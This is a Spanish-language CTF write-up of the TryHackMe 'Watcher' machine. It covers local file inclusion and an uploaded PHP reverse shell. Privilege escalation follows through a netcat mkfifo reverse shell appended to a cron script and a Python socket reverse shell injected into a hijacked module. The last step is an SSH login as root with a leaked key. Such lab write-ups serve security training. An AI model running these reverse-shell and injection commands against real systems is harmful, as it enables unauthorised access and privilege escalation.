---
layout: single
title: Watcherv 1.4
excerpt: "Work your way through the machine and try to find all the flags you can!"
date: 2022-05-27
classes: wide
header:
  teaser: /assets/images/thm-writeup-watcher/watcher_logo.png
  teaser_home_page: true
  icon: /assets/images/thm_ico.png
categories:
  - TryHackMe
  - infosec
tags:
  - Security
  - Linux
  - nmap
  - Burp Suite
  - Web
  - Reverse Shell
  - Privilege escalation
---

![logo](/assets/images/thm-writeup-watcher/watcher_logo.png)

- Link: <https://tryhackme.com/room/watcher>

A boot2root Linux machine utilising web exploits along with some common privilege escalation techniques, Work your way through the machine and try to find all the flags you can!

Made by @rushisec

---

## Flag 1 -> hint: (<https://moz.com/learn/seo/robotstxt>)

Revisando el directorio **"robots.txt"** encontramos una ruta, que al abrir, se evidencia la bandera correspondiente a este punto:

![flag1](/assets/images/thm-writeup-watcher/watcher_flag1.png)

---

## Flag 2 -> <https://www.netsparker.com/blog/web-security/local-file-inclusion-vulnerability/>

Con la segunda ruta que obtuvimos en el directorio **"robots.txt"** y con la pista, que nos indica que la página es vulnerable a **"lfi - local file inclusion"**, procedemos con los siguientes pasos:

2.1 Verificamos la vulnerabilidad con **burpsuite** listando la ruta **/etc/passwd** como se oberva a continuación

![flag2](/assets/images/thm-writeup-watcher/watcher_flag2_1.png)

2.2 Con está información, listamos la ruta No. 2 de **robots.txt**, obteniendo un usuario y contraseña **ftp**, como se observa en la siguiente imagen

![flag2](/assets/images/thm-writeup-watcher/watcher_flag2_2.png)

2.3 Con el usuario y contraseñas que encontramos en el paso anterior, ingresamos vía **ftp**, listamos los archivos y descargamos la **flag_2.txt** como mostramos a continuación

![flag2](/assets/images/thm-writeup-watcher/watcher_flag2_3.png)

---

## Flag 3 -> <https://outpost24.com/blog/from-local-file-inclusion-to-remote-code-execution-part-2>

3.1 Preparamos una **"reverse-shell.php"**, que descargamos de: <https://pentestmonkey.net/tools/web-shells/php-reverse-shell> configuramos los datos de la máquina atacante, como observamos a continuación:

![flag3](/assets/images/thm-writeup-watcher/watcher_flag3_1.png)

3.2 Subimos nuestra reverse shell al servidor **"ftp"**, con el comando **"put"** como lo muestra la siguiente imagen:

![flag3](/assets/images/thm-writeup-watcher/watcher_flag3_2.png)

3.3 Abrimos una terminal nueva y la ponemos en escucha por el puerto configurado, en nuestro caso **"4444"** con el siguiente comando:

~~~cs
nc -nlvp 4444
~~~

3.4 Ejecutamos la **rshell.php**, accediendo a la siguiente ruta <http://watcher.local/post.php?post=/home/ftpuser/ftp/files/php-reverse-rshell.php>, desde burpsuite o desde el navegador:

![flag3](/assets/images/thm-writeup-watcher/watcher_flag3_3.png)

3.5 Obtenemos la reverse shell y con el comando **SHELL=/bin/bash script -q /dev/null** realizamos el tratamiento de la shell.

3.6 Con el siguiente comando realizamos la búsqueda de la bandera 3:

~~~cs
find / -type f -name flag_3.txt 2>/dev/null
~~~

![flag3](/assets/images/thm-writeup-watcher/watcher_flag3_4.png)

---

## Flag 4 -> <https://www.explainshell.com/explain?cmd=sudo+-l>

- Con el siguiente comando podemos pasar al usuario "toby"

~~~cs
sudo -u toby /bin/bash
~~~

- Ya como "toby" obtenemos la bandera:

![flag4](/assets/images/thm-writeup-watcher/watcher_flag4.png)

---

## Flag 5 -> https://book.hacktricks.xyz/linux-unix/privilege-escalation#scheduled-cron-jobs

5.1 Con base en la pista entregada, procedemos a consultar los trabajos programados con  **"crontab"**:

~~~cs
cat /etc/crontab
~~~

![flag5](/assets/images/thm-writeup-watcher/watcher_flag5.png)

5.2 Observamos el script "cow.sh", el cual copia una foto entre directorios:

~~~cs
toby@watcher:~/jobs$ cat cow.sh
cat cow.sh
#!/bin/bash
cp /home/mat/cow.jpg /tmp/cow.jpg
~~~

5.3 Nos ponemos en escucha con **"nc"** en el puerto 5555
  
~~~cs
nc -nlvp 5555
~~~

5.4 Nos ubicamos en la ruta en la que se encuentra el script e inyectamos una reverse shell en el script **"cow.sh"** con el siguiente comando:

~~~cs
echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.9.0.68 5555 >/tmp/f" >> cow.sh
~~~

5.5 Ejecutamos el script:

~~~cs
./cow.sh
~~~

5.6 Obtenemos una reverse shell como **"mat" y la bandera solicitada:

~~~cs
└─# nc -nlvp 5555
listening on [any] 5555 ...
connect to [10.9.0.68] from (UNKNOWN) [10.10.107.245] 40532
sh: 0: can't access tty; job control turned off
$ whoami
mat
$ python3 -c 'import pty; pty.spawn("/bin/bash")'
mat@watcher:~$ ls
ls
cow.jpg  flag_5.txt  note.txt  scripts
cat flag_5.txt
FLAG{????????}
mat@watcher:~$ 
~~~

## Flag 6 -> <https://book.hacktricks.xyz/linux-unix/privilege-escalation#python-library-hijacking>

6.1 con el comando **"sudo -l"** se observa que el usuario **"will"** puede ejecutar como sudo el siguiente script en python:

![flag6](/assets/images/thm-writeup-watcher/watcher_flag6.png)

6.2 En la siguiente imagen se observa el contenido del script:

![flag6](/assets/images/thm-writeup-watcher/watcher_flag6_1.png)

- Revisando el código se observa qu este realiza el llamado a **"cmd.py"** ecript que se encuentra en el mismo directorio como se ve en la siguiente imagen:

![flag6](/assets/images/thm-writeup-watcher/watcher_flag6_2.png)

6.3 En una nueva terminal (No. 2), nos ponemos en escucha con **"nc"** en el puerto 6666
  
~~~cs
nc -nlvp 6666
~~~

6.4 Con la información recolectada desde la terminal No. 1, procedemos a inyectar en el script **"cmd.py"** la siguiente reverse shell en **"python"** de acuerdo con la información de la siguiente página: <https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#python>:

~~~go

echo 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.9.0.68",6666));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])' > cmd.py

~~~

6.5 Ejecutamos el script **"will_script.py"** con el siguiente comando:

~~~cs
sudo -u will /usr/bin/python3 /home/mat/scripts/will_script.py 1
~~~

![flag6](/assets/images/thm-writeup-watcher/watcher_flag6_4.png)

6.6 Con estos pasos obtnemos una **"shell"** como el usuario **"will"**:

![flag6](/assets/images/thm-writeup-watcher/watcher_flag6_3.png)

6.7 En el directorio del usuario **"will"** encontramos la bandera No. 6

![flag6](/assets/images/thm-writeup-watcher/watcher_flag6_5.png)

---

## Flag 7 -> <https://explainshell.com/explain?cmd=ssh%20-i%20keyfile%20host>

7.1 De acuerdo con la pista entregada, se evidencia que esta última bandera  está relacionada con una **"ssh - key"**:

![flag7](/assets/images/thm-writeup-watcher/watcher_flag7.png)

7.2 En la ruta **"/opt/backups"** encontramos el documento codificado -> **"key.b64"**:

![flag7](/assets/images/thm-writeup-watcher/watcher_flag7_1.png)

7.3 Lo decodificamos desde **"cyberchef"** usando;  **"From Base 64 decode"** y obtenemos una **"RSA private key (ssh)"**:

![flag7](/assets/images/thm-writeup-watcher/watcher_flag7_2.png)

7.4 En una nueva términal, guardamos la **"RSA private key (ssh)"** como **"id_rsa"**, y le asigamos permiso **"600"** -> **"(Rw -------) El propietario puede leer y escribir en un archivo. Todos los demás no tienen derechos. Un valor común para los archivos de datos que el propietario quiere mantener en privado."**:

~~~cs
nano id_rsa ##dentro de este archivo guardamos la RSA private key
chmod 600 id_rsa
~~~

7.5 Ingresamos con el siguiente comando asumiendo que el usuario es **"root"** porque es la última bandera y al istar encontramos la bandera No. 7:

~~~go
ssh -i id_rsa root@watcher.local
~~~

![flag7](/assets/images/thm-writeup-watcher/watcher_flag7_3.png)

---

Eso es todo!

---

## Fuentes

- Cyberchef:
<https://gchq.github.io/CyberChef/>

- Que son Los permisos 777 755 700 664 666 y CHMOD:
<https://americandominios.com/conta/knowledgebase/627/Que-son-Los-permisos-777-755-700-664-666-y-CHMOD.html>

- explainshell.com
<https://explainshell.com/explain?cmd=ssh%20-i%20keyfile%20host>

- Reverse Shell Cheat Sheet
<https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#python>
